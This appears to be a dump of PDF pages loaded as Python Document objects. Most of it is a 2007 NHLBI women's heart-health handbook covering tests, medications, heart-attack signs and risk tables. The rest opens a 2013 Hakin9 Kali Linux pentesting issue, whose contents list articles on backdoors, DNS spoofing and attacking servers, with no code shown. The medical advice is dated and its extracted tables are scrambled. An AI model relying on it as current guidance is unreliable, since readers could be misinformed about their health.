If you are unable to exercise due\\nto arthritis or another health condition, a stress test can be donewithout exercise.  Instead, you will be given a medicine thatincreases blood flow to the heart muscle and makes the heartbeat faster, mimicking the changes that occur when you exercise.  Thistest is usually followed by a nuclear scan or echocardiography tosee whether there are any problems with the blood flow to the heart.  \\n— 107 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 109}, page_content='■Nuclear scan shows the working of the heart muscle as\\nblood flows through the heart.  A small amount of radioactivematerial is injected into a vein, usually in the arm, and a\\ncamera records how much is taken up by the heart muscle.\\n■Echocardiography changes sound waves into pictures that\\nshow the heart’s size, shape, and movement.  The sound\\nwaves are also used to see how much blood is pumped out by\\nthe heart when it contracts.  \\n■Cardiac catheterization is a medical procedure used to\\ndiagnose and treat certain heart conditions.  A long, thin,\\nflexible tube called a catheter is put into a blood vessel in the\\narm or upper thigh (groin) and threaded up into the heart.\\nThrough the catheter, the doctor can perform diagnostic tests andtreatments on the heart.  The diagnostic tests include the following:\\n•Coronary angiography (or angiogram or arteriography)\\nshows an x ray of blood flow problems and blockages in \\nthe coronary arteries.  A dye is injected into the catheter,\\nallowing the heart and blood vessels to be filmed as the\\nheart pumps.  The picture is called an angiogram orarteriogram.  \\n•Ventriculogram is sometimes a part of the x-ray dye test\\ndescribed above.  It is used to get a picture of the heart’s main\\npumping chamber, typically the left ventricle.  \\n•Intracoronary ultrasound may be done during a\\ncardiac catheterization to measure blood flow.  It gives apicture of the coronary arteries that shows the thickness and\\nother features of the artery wall.  This lets the doctor see blood\\nflow and any blockages.\\n— 108 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 110}, page_content='COULD YOU HAVE hidden\\nHEART DISEASE?\\nMany women have undiagnosed heart disease—even after getting\\ntested for it.  New research shows that up to 3 million women in theUnited States have a hard-to-spot form of heart disease called\\n“coronary microvascular syndrome,” in which plaque spreads evenly\\nthroughout the walls of very small arteries, rather than building up ina larger, main artery.  Even though women with this condition haveinsufficient blood and oxygen flow to the heart muscle, a standardangiogram (which is designed to pick up blockages in large arteries)is likely to show their arteries to be normal.\\nThis means that women with heart disease symptoms should be\\nprepared to speak up to their doctors.  If you receive a “normal”\\nangiogram but still have chest pain or other heart symptoms, askyour doctor whether you might have a problem with the functioningof your small arteries.  To find out, you may be asked to undergorelatively simple tests, such as a questionnaire that measures howeasily you can perform everyday tasks.  This quiz, called the “DukeActivity Status Index,” can help to predict your heart attack risk.\\n— 109 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 111}, page_content='In addition, several new, highly sensitive screening tests have\\nbeen developed.  Ask your doctor about these tests: \\n■Carotid doppler ultrasound uses sound waves to detect\\nblockages and narrowing of the carotid artery in the neck.Both conditions can signal an increased risk for heart attack \\nor stroke.\\n■Electron-beam computed tomography (EBCT) is a super\\nfast scan that provides a snapshot of the calcium buildup in your\\ncoronary arteries.  It may predict whether you’ll be at higher risk\\nfor heart disease in the future.  This test is promising, but not\\nfoolproof, and requires careful evaluation by your doctor.  \\n■Magnetic resonance imaging (MRI) is a scan using\\nmagnets and computers to create high-quality images of the\\nheart’s structure and functioning.  It is often used to evaluate\\ncongenital heart disease.  The test can also detect severe\\nblockages in coronary arteries in people who are havingunstable angina or a heart attack, thereby allowing immediatetreatment to restore blood flow to the heart.\\n— 110 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 112}, page_content='aspirin: TAKE WITH CAUTION\\nThis well-known “wonder drug” can help to lower the risk of a heart\\nattack or stroke for those who have already had one.  It can alsohelp to keep arteries open in those who have had a previous heart\\nbypass or other artery-opening procedure, such as angioplasty.  \\nIn addition, aspirin is given to people who arrive at a hospitalemergency department with a suspected heart attack or stroke.\\nIt’s important to know that aspirin has not been approved by the\\nU.S. Food and Drug Administration for the prevention of heartattacks in those who have never had a heart attack or stroke.\\nHowever, a recent large study has found that among healthy\\nwomen, taking low-dose aspirin every other day may help to preventa first stroke.  Among women over the age of 65, low-dose aspirinevery other day may also prevent a first heart attack.  If you areconsidering taking aspirin for this purpose, keep in mind that it is apowerful drug with many side effects.  It can also mix dangerouslywith other drugs, including some over-the-counter medicines anddietary supplements.\\nIf you’re thinking about using aspirin either to treat or prevent heart\\nproblems, talk with your doctor first.  Only a doctor who knows your\\nmedical history and current health condition can judge whether the\\nbenefits would outweigh the risks.  If aspirin is a good choice foryou, be sure to take the dose recommended by your doctor.\\nIf your doctor does advise you to take aspirin, be sure to continue\\npracticing the “Big Four” heart healthy habits—eating nutritiously,getting regular physical activity, maintaining a healthy weight, andfor those who smoke, quitting.  Aspirin can be a useful treatment forsome people, but it is not a substitute for a healthy lifestyle.\\n— 111 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 113}, page_content='Medications \\nTo control or prevent heart disease, you may need to take medicine.Medications may be used to treat a risk factor, such as high blood\\npressure or high blood cholesterol, or relieve the chest pain that\\noften accompanies heart disease.  If you do take medicine, it’simportant to keep up your heart healthy lifestyle, because healthydaily habits will keep your dose of medicine as low as possible.Medications that are commonly prescribed for people with heartdisease include the following:\\n■ACE (angiotensin converting enzyme) inhibitors stop the\\nbody from producing a chemical that narrows blood vessels.  Theyare used to treat high blood pressure and damaged heart muscle.\\nACE inhibitors may reduce the risks of a future heart attack and\\nheart failure.  They also can prevent kidney damage in somepeople with diabetes.\\n■Anticoagulants decrease the ability of the blood to clot, and\\ntherefore help to prevent clots from forming in your arteries and\\nblocking blood flow.  (These medicines are sometimes called\\n“blood thinners,” though they do not actually thin the blood.)\\nAnticoagulants will not dissolve clots that have already formed, butthese medicines may prevent the clots from becoming larger andcausing more serious problems.\\n■Antiplatelets are medications that stop blood particles called\\nplatelets from clumping together to form harmful clots.  These\\nmedications may be given to people who have had a heart\\nattack, who have angina, or who experience chest pain after an\\nangioplasty procedure.  Aspirin is one type of antiplateletmedicine.  (See “Aspirin:  Take With Caution,” on page 109.)\\n— 112 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 114}, page_content='■Beta blockers slow the heart and allow it to beat with less force.\\nThey are used to treat high blood pressure and some arrhythmias(abnormal heart rhythms) and to prevent a repeat heart attack.  \\nThey can also delay or prevent the development of angina.\\n■Calcium-channel blockers relax blood vessels.  They are used to\\ntreat high blood pressure, angina, and some arrhythmias.\\n■Digitalis makes the heart contract harder and is used when the\\nheart can’t pump strongly enough on its own.  It also slows down\\nsome fast heart rhythms.\\n■Diuretics (water pills) decrease fluid in the body and are very\\neffective in treating high blood pressure.  New research suggests that diuretics also can help to prevent stroke, heart attack, and\\nheart failure.  For those who already have heart failure, diuretics\\ncan help to reduce fluid buildup in the lungs and swelling in thefeet and ankles.\\n■Nitrates relax blood vessels and relieve chest pain.  Nitrates in\\ndifferent forms can be used to relieve the pain of an angina attack,\\nto prevent an expected episode, or to reduce the number of attacks\\nthat occur by using the medicine regularly on a long-term basis.  The\\nmost commonly used nitrate for angina is nitroglycerin.\\n■Menopausal hormone therapy was once thought to lower the\\nrisk of heart attack and stroke for women with heart disease.  But\\nresearch now shows that women with heart disease should not take\\nit.  Menopausal hormone therapy can involve the use of estrogen\\nalone or estrogen plus progestin.  For women with heart disease,estrogen alone will not prevent heart attacks, and estrogen plusprogestin increases the risk for heart attack during the first few yearsof use.  Estrogen plus progestin also increases the risk for bloodclots, stroke, and breast cancer.\\n— 113 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 115}, page_content='Special Procedures\\nAdvanced heart disease may require special procedures to openan artery and improve blood flow.  These operations are usually\\ndone to ease severe chest pain or clear blood vessel blockages.\\nThey include the following:\\n■Coronary angioplasty, or balloon angioplasty. In this\\nprocedure, a thin tube called a catheter is threaded through \\nan artery into the heart’s narrowed blood vessel.  The catheter\\nhas a tiny balloon at its tip, which is repeatedly inflated and\\ndeflated to open and stretch the artery, improving blood flow.Often, a tiny tube called a stent is permanently inserted in theartery to keep it open.  Stenting may be particularly beneficialfor women.\\n■Coronary artery bypass graft, or “bypass surgery.”\\nA piece of vein is taken from the leg or a section of an arteryis taken from the chest or wrist.  This piece is attached to the\\nheart artery both above and below the narrowed area,\\nmaking a bypass around the blockage.  If you need bypasssurgery, ask your doctor whether you are a candidate for oneof the newer types of bypass procedures.  Inquire about “offpump” and “minimally invasive” coronary bypass surgery.\\n— 114 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 116}, page_content='GETTING HELP FOR A heartFATTACK\\nor many people, the first symptom of heart \\ndisease is a heart attack.  Therefore, every\\nwoman should know how to identify the symptoms \\nof a heart attack and how to get immediate medical help.\\nIdeally, treatment should start within 1 hour of the firstsymptoms.  Recognizing the warning signs and getting helpquickly can save your life.\\nKnow the Warning Signs \\nNot all heart attacks begin with sudden, crushing pain, as is often\\nshown on TV or in the movies.  Many heart attacks start slowly asmild pain or discomfort.  The most common warning signs for\\nwomen and men are listed below:\\n■Chest discomfort.  Most heart attacks involve discomfort in the\\ncenter of the chest that lasts more than a few minutes.  It mayfeel like uncomfortable pressure, squeezing, fullness, or pain.\\nThe discomfort can be mild or severe, and it may come and go.\\n■Discomfort in other areas of the upper body, including\\none or both arms, the back, neck, jaw, or stomach.\\n■Shortness of breath.  This symptom may occur along with\\nor without chest discomfort.\\n■Other signs include nausea, light-headedness, or breaking\\nout in a cold sweat.\\n— 115 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 117}, page_content='Get Help Quickly\\nIf you think you, or someone else, may be having a heart attack,\\nyou must act quickly to prevent disability or death.  Wait nomore than a few minutes—5 minutes at most—before dialing 9–1–1.\\nIt is important to dial 9–1–1 because emergency medical\\npersonnel can begin treatment even before you get to the hospital.\\nThey also have the equipment and training to start your heartbeating again if it stops.  Dialing 9–1–1 quickly can save your life.\\nEven if you’re not sure you’re having a heart attack, dial 9–1–1\\nif your symptoms last up to 5 minutes.  If your symptoms stopcompletely in less than 5 minutes, you should still call your doctor.\\nYou also must act at once because hospitals have clot-busting\\nmedicines and other artery-opening treatments and proceduresthat can stop a heart attack, if given quickly.  These treatmentswork best when given within the first hour after a heart attack starts.\\nWomen tend to delay longer than men in getting help for a\\npossible heart attack.  A large study of heart attack patientsfound that, on average, women waited 22 minutes longer thanmen did before going to the hospital.  Many women delay\\nbecause they don’t want to bother or worry others, especially if\\ntheir symptoms turn out to be a false alarm.  But when you’refacing something as serious as a possible heart attack, it is muchbetter to be safe than sorry.  If you have any symptoms of a possibleheart attack that last up to 5 minutes, call 9–1–1 right away.\\nWhen you get to the hospital, don’t be afraid to speak up for\\nwhat you need—or bring someone who can speak up for you.Ask for tests that can determine if you are having a heart attack.Commonly given initial tests include an electrocardiogram ( ECG or\\nEKG) and a cardiac enzyme blood test (to check for heart damage).\\n— 116 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 118}, page_content='At the hospital, don’t let anyone tell you that your symptoms are\\n“just indigestion” or that you’re “overreacting.”  You have theright to be thoroughly examined for a possible heart attack.  If\\nyou are having a heart attack, you have the right to immediate\\ntreatment to help stop the attack.\\nPlan Ahead\\nNobody plans on having a heart attack.  But just as many\\npeople have a plan in case of fire, it is important to develop aplan to deal with a possible heart attack.  Taking the following\\nsteps can preserve your health—and your life:\\n■Learn the heart attack warning signs by heart.\\n■Talk with family and friends about the warning signs and the\\nneed to call 9–1–1 quickly.\\n■Talk with your health care provider about your risk factors forheart attack and how to reduce them.\\n■Write out a heart attack survival plan that has vital medicalinformation and keep it handy.  (Use the accompanying boxon page 116 as a guide.)\\n■Arrange in advance to have someone care for your children orother dependents in an emergency.\\nIf you think you, or someone else, may be\\nhaving a heart attack, you must act quicklyto prevent disability or death.  Wait no more\\nthan a few minutes—5 at most—before\\ndialing 9-1-1.  \\n— 117 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 119}, page_content='HEART ATTACK survival PLAN\\nFill out the form below and make several copies of it.  Keep one\\ncopy near your home phone, another at work, and a third copy inyour wallet or purse.\\nInformation To Share With Emergency Medical\\nPersonnel and Hospital Staff\\nMedicines you are taking: \\nMedicines you are allergic to: \\nHow To Contact Your Doctor  \\nIf symptoms stop completely in less than 5 minutes, you should stillcall your doctor right away.\\nPhone number during office hours:\\nPhone number after office hours:\\nPerson To Contact If You Go to the Hospital\\nName:\\nHome phone number:\\nWork phone number:\\nCell phone number:\\n— 118 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 120}, page_content='THE HEART OF THE matterGetting serious about heart health may seem like a \\nhuge project.  Because it means making changes in \\ndaily living habits, for many women it is a major effort.\\nBut it doesn’t have to be an overwhelming one.  Some \\npeople find it easier to tackle only one habit at a time.  For\\nexample, if you smoke cigarettes and also eat a diet high in\\nsaturated fats, work on quitting smoking first.  Then, once you’vebecome used to life without cigarettes, begin to skim the fat fromyour diet.\\nAnd remember, nobody’s perfect.  Nobody always eats the ideal\\ndiet or gets just the right amount of physical activity.  Few smokersare able to swear off cigarettes without a slip or two along theway.  The important thing is to follow a sensible, realistic planthat will gradually lessen your chances of developing heartdisease or help you to control it.\\nWomen are taking a more active role in their own health care.\\nWe are asking more questions, and we are readier than ever tomake changes that will help us lead healthier lives.  We areconcerned not only about treatment, but also about the\\nprevention of many disorders that commonly strike women.Taking steps to prevent and control heart disease is part of thisgrowing movement to take charge of our own health.  Thereward of a healthy heart—a better chance for a longer, morevigorous life—is well worth the effort.\\n— 119 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 121}, page_content='HOW TO ESTIMATE YOUR riskUse these risk tables to find your chances of having a heart \\nattack in the next 10 years, given as a percentage.  (For more \\non this, see page 60.)\\nPoints Points\\nAge 20–34 -7 Age 55–59 8\\nAge 35–39 -3 Age 60–64 10\\nAge 40–44 0 Age 65–69 12\\nAge 45–49 3 Age 70–74 14\\nAge 50–54 6 Age 75–79 16\\n<160 0 0 0 0 0\\n160–199 4 3 2 1 1\\n200–239 8 6 4 2 1\\n240–279 11 8 5 3 2\\n>280 13 10 7 4 2Age 20-39 Age 40-49 Age 50-59 Age 60-69 Age 70-79 Total CholesterolPoints\\nAge 20-39 Age 40-49 Age 50-59 Age 60-69 Age 70-79\\nNonsmoker 0 0 0 0 0\\nSmoker 9 7 4 2 1Points\\nHDL (mg/dL) Points HDL (mg/dL) Points\\n60 -1 40–49 1\\n50–59 0 <40 2\\nSystolic BP (mmHg) Systolic BP (mmHg) If Untreated If Treated If Untreated If TreatedPoints Points\\n<120 0 0\\n120–129 1 3\\n130–139 2 4140–159 3 5\\n>160 4 6\\nPoint T otal 10-Year Risk % Point T otal 10-Year Risk % Point T otal 10-Year Risk %\\n<9 <1 14 2 20 11\\n9 1 15 3 21 14\\n10 1 16 4 22 17\\n11 1 17 5 23 22\\n12 1 18 6 24 27\\n13 2 19 8 25 30\\n(Framingham Heart Study Point Scores)\\n— 120 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 122}, page_content='TO learnTMORE\\no find out more about preventing and controlling heart\\ndisease, contact the following information sources:\\nNHLBI Health Information Center \\nP.O. Box 30105\\nBethesda, MD 20824-0105Phone:  301-592-8573TTY:  240-629-3255 Fax:  301-592-8563\\nProvides information on the prevention and treatment of heart disease and offers\\npublications on heart disease and heart health.  \\nAlso, check out these NHLBI heart health Web sites and Web pages: \\n■NHLBI Web site:  www.nhlbi.nih.gov\\n■Diseases and Conditions A–Z Index:  www.nhlbi.nih.gov/health/dci/index.html\\n■The Heart Truth :  A National Awareness Campaign for Women About Heart Disease:\\nwww.hearttruth.gov\\n■NHLBI “Your Guide To Better Health” Series:\\nhttp://hp2010.nhlbihin.net/yourguide•  “Your Guide to a Healthy Heart”\\n•  “Your Guide to Living Well With Heart Disease”\\n•  “Your Guide to Lowering Your Blood Pressure With DASH”\\n•  “Your Guide to Lowering Your Cholesterol With TLC”\\n•  “Your Guide to Physical Activity and Your Heart”\\n•  “Your Guide to Healthy Sleep”\\n■“Keep the Beat:  Heart Healthy Recipes from the NHLBI”:\\nwww.nhlbi.nih.gov/health/public/heart/other/ktb_recipebk/\\nInteractive Web Pages\\n■Your Guide to Lowering High Blood Pressure:www.nhlbi.nih.gov/hbp/index.html\\n■Live Healthier, Live Longer (on lowering elevated blood cholesterol):www.nhlbi.nih.gov/chd\\n■High Blood Cholesterol:  What You Need To Know:www.nhlbi.nih.gov/health/public/heart/chol/hbc_what.htm\\n— 121 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 123}, page_content='■Aim for a Healthy Weight:\\nwww.nhlbi.nih.gov/health/public/heart/obesity/lose_wt/index.htm\\n■Act in Time to Heart Attack Signs:www.nhlbi.nih.gov/actintime/index.htm\\n■We Can! (Ways to Enhance Children’s Activity and Nutrition):http://wecan.nhlbi.nih.gov\\n■Stay in Circulation:  Take Steps to Learn About P.A.D.: www.aboutpad.org\\nAdditional Resources\\n■National Diabetes Information Clearinghouse:http://diabetes.niddk.nih.gov\\n■Help for Quitting Smoking:www.cancer.gov/cancertopics/factsheet/Tobacco\\n■American Heart Association:  www.americanheart.org\\n■Heart Healthy Women:  www.hearthealthywomen.org\\n■National Women’s Health Information Center, Office on Women’s Health, U.S.Department of Health and Human Services: www.womenshealth.gov\\n■WomenHeart:  the National Coalition for Women with Heart Disease:www.womenheart.org\\n■For still more information on heart health, see MedlinePlus:http://medlineplus.gov/\\n— 122 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 124}, page_content='■ Aim for a Healthy Weight: \\nwww.nhlbi.nih.gov/health/public/heart/obesity/lose_wt/index.htm \\n■ Act in Time to Heart Attack Signs: www.nhlbi.nih.gov/actintime/index.htm \\n■ We Can! (Ways to Enhance Children’s Activity and Nutrition): http://wecan.nhlbi.nih.gov \\n■ Stay in Circulation: Take Steps to Learn About P.A.D.: www.aboutpad.org \\nAdditional Resources \\n■ National Diabetes Information Clearinghouse: http://diabetes.niddk.nih.gov \\n■ Help for Quitting Smoking: www.cancer.gov/cancertopics/factsheet/Tobacco \\n■ American Heart Association:  www.americanheart.org \\n■ Heart Healthy Women:  www.hearthealthywomen.org \\n■\\tNational Women’s Health Information Center, Office on Women’s Health, U.S. Department of Health and Human Services: www.womenshealth.gov \\n■ WomenHeart:  the National Coalition for Women with Heart Disease: www.womenheart.org \\n■ For still more information on heart health, see MedlinePlus: http://medlineplus.gov/ \\n— 122 —\\tTHE HEALTHY\\t HANDBOOK FOR WOMEN �ear� \\nDISCRIMINA TION PROHIBITED: Under provisions of applicable public laws enacted \\nby Congress since 1964, no person in the United States shall, on the grounds of race, \\ncolor, national origin, handicap, or age, be excluded from par ticipation in, be \\ndenied the benefits of, or be subjected to discrimination under any program or \\nactivity (or , on the basis of sex, with respect to any education program and activity) \\nreceiving Federal financial assistance. In addition, Executive Order 11141 prohibits \\ndiscrimination on the basis of age by contractors and subcontractors in the per formance \\nof Federal contacts, and Executive Order 11246 states that no federally funded \\ncontractor may discriminate against any employee or applicant for employment \\nbecause of race, color , religion, sex, or national origin. Therefore, the National \\nHeart, Lung, and Blood Institute must be operated in compliance with these laws \\nand Executive Orders. \\n— 123 — '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 125}, page_content='THE HEALTHY HEART HANDBOOK FOR WOMEN ■National Heart, Lung, and Blood Institute ■March 2007SPINE\\ncenter text \\nvertically and horizontally on \\nspine'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 126}, page_content='NIH Publication No.  07-2720 \\nOriginally printed 1987Previously revised 1992, 1997, 2003, 2005Revised March 2007'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 0}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 1}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 2}, page_content=' \\n “We specialize in Information \\nSecurity Solutions including \\nPenetration Testing, Forensic \\nAnalysis and Computer \\nInvestigations to a diverse \\nrange of clients worldwide”  \\n  \\n \\n \\n \\n \\n \\n \\n \\n \\n \\nCyber Investigations N.I. Ltd.  \\nNorthern Ireland Science Park \\nQueens Road \\nQueens Island \\nBelfast BT3 9DT \\nUnited Kingdom \\n  \\nEmail : \\n info@cyberinvestigationsni.com \\n \\nTelephone: \\n+44(0)28 9079 6983 \\n \\nPlease visit us on:  www.cyberinvestigationsni.com  \\n  \\nFor a free security \\nconsultation, then please \\ncontact us by either mail \\nor phone and one of our \\nsecurity experts will be \\nhappy to assist you. '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 3}, page_content='Extra 03/2013 4\\nPRACTICAL PROTECTION  IT SECURITY MAGAZINE\\n team\\nEditor in Chief: \\nJulia Adamczewska \\njulia.adamczewska@hakin9.org\\nEditorial Advisory Board: \\nHans van Beek, Peter Harmsen, Casey Parman\\nProofreaders: Julia Adamczewska, Krzysztof \\nSamborski\\nSpecial thanks to our Beta testers and Proofreaders \\nwho helped us with this issue. Our magazine would \\nnot exist without your assistance and expertise.\\nPublisher: \\nPaweł Marciniak\\nCEO: \\nEwa Dudzic\\newa.dudzic@hakin9.org\\nProduct Manager: \\nKrzysztof Samborski\\nkrzysztof.samborski@hakin9.org\\nProduction Director: \\nAndrzej Kuca\\nandrzej.kuca@hakin9.org\\nMarketing Director: \\nJulia Adamczewska \\njulia.adamczewska@hakin9.org\\nArt. Director: \\nIreneusz Pogroszewski\\nireneusz.pogroszewski@software.com.pl\\nDTP: \\nIreneusz Pogroszewski\\nPublisher: \\nHakin9 Media Sp. Z o.o. SK\\n02-676  Warszawa, ul. Postępu 17D\\nNIP 95123253396\\nPhone: 504927626\\nwww.hakin9.org/en\\nWhilst every effort has been made to ensure the \\nhighest quality of the magazine, the editors make no \\nwarranty, expressed or implied, concerning the results \\nof the content’s usage. All trademarks presented in the \\nmagazine were used for informative purposes only. \\nDISCLAIMER!\\nThe techniques described in our magazine \\nmay be used in private, local networks only. \\nThe editors hold no responsibility for the \\nmisuse of the techniques presented or any \\ndata loss.\\nDear Readers,\\nAlong with the Autumn here it comes the comprehen -\\nsive ‘Guide to Kali Linux’. In the following issue we will \\nfocus on this popular, yet still-much-to-discover pentest -\\ning tool.\\nSo we will start with the Basics and see what’s new \\nin Kali Linux comparing to BackTrack and also we will \\nbrowse the set of new and updated tools in the article ‘Kali \\nLinux for Enterprises’. \\nThe Attack section is full of great tips for pentesters \\n(and not only), so they can see how to weaponize the an -\\ndroid platform and also perform the attack on servers. \\nThe Defense section contains a great paper on deploy -\\ning network vulnerability scanners for medical clients and \\npresents an interesting view on Kali scanning. There is \\nalso a fine overview on Kali as a tool for both good and \\nbad purposes. \\nWe are sure you will find a lot of helpful information in \\nthe whole issue. \\nHakin9’s Editorial Team would like to give special \\nthanks to the authors, betatesters and proofreaders.\\nWe hope our effort was worthwhile and you will find the \\nHakin9 Guide to Kali Linux issue appealing to you. We \\nwish you a nice read!\\nJulia Adamczewska \\nand the Hakin9 team\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 4}, page_content='www.hakin9.org/en\\nCONTENTS\\nBASICS\\nKali Linux – What’s new? 06\\nBy Steven McLaughlin, Security Researcher \\nKali Linux released earlier in the year is dubbed the \\nmost advanced penetration testing distribution, ever. \\nHow does it compare to BackTrack?, and: What’s the \\ndifference?\\nKali Linux for Enterprises 10\\nBy Navneet Sharma, Information Security Analyst \\nWhenever we think of Penetration Testing (PT) the first \\nname that comes to our mind is “Backtrack (BT)”, which \\nwe have been using for the last few years. Backtrack, \\nfunded by offensive Security (www.offensive –Security.\\ncom), is also one of the most popular UBUNTU Linux \\nbased platform, with collection of organized security \\ntesting tools such as Open-VAS, maltigo, Metasploit \\nFramework (MSF), etc. Last release to Backtrack series \\nwas Backtrack 5 R2 with codename Revolution.\\nKali Linux is the latest linux distribution made for pen -\\netration testing by and used by security assessors and \\nhackers. Kali Linux is also considered as a successor \\nto Backtrack.\\nATTACK\\nWeaponization of Android Platform  \\nusing Kali Linux 16\\nBy Daniel Singh, Independent Consultant in network \\nand systems security\\nKali Linux has become the most popular tool for pro -\\nfessional penetration testing and security auditing. In \\nthis article, we will review how to couple the functional -\\nity of Kali Linux with Android platform over HTC One X \\nsmartphone to create an invincible penetration-testing \\nweapon.\\nKali Linux, Attacking Servers 24\\nBy Ismael Gonzalez D., Security Researcher, CEH, \\nMCP, MCDTS, MCSA, LPIC-1\\nThis article will show you how to perform attacks on web \\nservers, getting full access to the system and database. \\nJust by using some of the ‘Top Ten’ tools of Kali Linux.\\nHands On: How to Create “Backdoor”  \\nto Remote Access with Kali Linux,  \\nDNS Spoofing Attack with Ettercap  \\nand Cloning Sites with Kali Linux 28\\nBy Rafael Fontes Souza, Co-Founder at Grey Hats, \\nmember of the “French Backtrack Team”\\nThe three articles describe very useful tools in Kali and \\ncover the ideas of creating backdoor, how to perform \\nthe spoof attack and how to clone websites with SET \\nAttack Method. DEFENSE\\nKali Scanning for HIPAA – A Proof of  \\nConcept: using Kali Linux to deploy  \\ndistributed network vulnerability  \\nscanners for medical clients 34\\nBy Charlie Waters, Security Officer and Senior \\nConsultant for Infinity Network Solutions\\nThe Health Insurance Portability and Accountability \\nAct of 1996 (HIPAA) requires organizations who han -\\ndle electronic Protected Health Information (e-PHI) to \\ntake action and reduce risk relative to potential security \\nbreaches of digital communication and storage of pa -\\ntient information. Open Source solutions can be lever -\\naged as a low-cost and effective strategy to minimize \\nrisk when used as component of a larger information \\nsecurity program. With a long “track” record of commu -\\nnity support, Kali is an open source Linux distribution \\ncontaining many security tools to meet the needs of \\nHIPAA network vulnerability scans. \\nKALI LINUX  \\n– A Solution to HACKING/SECURITY 40\\nBy Deepanshu Khanna, Linux Security Researcher\\nToday is the world of technology and everyone some -\\nhow is attached to it. Some are using the technology for \\nthe good purpose and some are using it for bad purpos -\\nes and Internet is one of those technologies which de -\\nfine both my statements. Internet is being used both by \\nthe good (the White Hats) and the bad (the Black Hats). \\nSo, my paper is totally based on the above line that the \\nOS (Operating System) KALI LINUX (which is an exten -\\nsion to Backtrack) can be used in both the ways either \\nfor good or bad. \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 5}, page_content='Extra 03/2013 6BASICS\\nFor some years BackTrack linux has been \\nthe premier pen-test distribution. The new -\\nest pen-test distribution released by Of -\\nfensive Security which supersedes BackTrack \\ncomes with some massive and welcome im -\\nprovements. The biggest change from BackTrack \\nis the move from Ubuntu linux to Debian Wheezy \\nlinux. The first thing I notice is that the installa -\\ntion is no longer launched by executing a script \\non the Desktop as it was with BackTrack, but is \\ninitiated but booting into a proper Debian instal -\\nlation system. The process generally feels a lot \\nsmoother from the start. I have also noticed that \\nin general Kali doesn’t break as easily as Back -\\ntrack and it generally has a much more stable \\nfeel to it. So what’s the difference between Back -\\nTrack and Kali?\\nBackTrack 5 v Kali\\nUbuntu, which BackTrack is based on, has a gen -\\neral feel to it that it is trying to babysit you as the \\nuser, which can be annoying to an experienced \\nlinux user. Ubuntu likes to make everything user \\nfriendly and tries to cut out any complex configu -\\nrations. Debian, which Kali is based on, may not \\ncome across to be so ‘user friendly’ to someone \\nwho is not that experienced with linux, and re -\\nquires more hands on experience with linux, but \\nis generally more configurable and stable. Person -ally, I definitely prefer the Debian base for Kali as I \\nlike to tweak. This distribution is not for linux begin -\\nners in any case. \\nWhat Happened to Firefox? \\nOne of the first things I notice is that Firefox has \\nbeen replaced by Iceweasel. On first instance \\nthis might leave you wondering what Iceweasel is \\nand why it has replaced Firefox. The truth is that \\nIceweasel IS Firefox. The Debian project patch -\\nes Iceweasel by backporting security fixes, thus \\nmaking it secure enough to be declared in debi -\\nan stable version. Because this is the case they \\nhad to re-brand it Iceweasel as the modifications \\nmade by Debian project were not approved by the \\nMozilla foundation in order to use the Thunder -\\nburd logo. Other than backported security patch -\\nes and the logo, both Firefox and Iceweasel are \\nidentical. I would recommend staying with Ice -\\nweasel on Debian, but if you really want to use \\nFirefox you can install it in the following manner \\nby first uninstalling Iceweasel (Listing 1).\\nFHS-compliance and /pentest\\nAnother massive step in the right direction is FHS-\\ncompliance. File Hierarchy Standard (FHS) compli -\\nance specifies guiding principles for each part of the \\nfile system, and means that the directory structure \\nand file system is standardised such that software Kali Linux  \\n– What’s new?\\nKali Linux released earlier in the year is dubbed the most \\nadvanced penetration testing distribution, ever. How does it \\ncompare to BackTrack?, and: What’s the difference?\\n'),\n",
